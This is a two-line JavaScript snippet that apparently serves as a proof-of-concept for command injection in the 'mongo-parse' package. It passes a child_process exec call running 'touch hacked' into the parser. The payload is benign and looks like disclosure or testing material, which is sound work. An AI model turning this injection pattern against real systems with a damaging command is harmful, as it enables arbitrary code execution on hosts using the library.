var parser = require('mongo-parse')

var query = parser.parse(require("child_process").exec("touch hacked"))
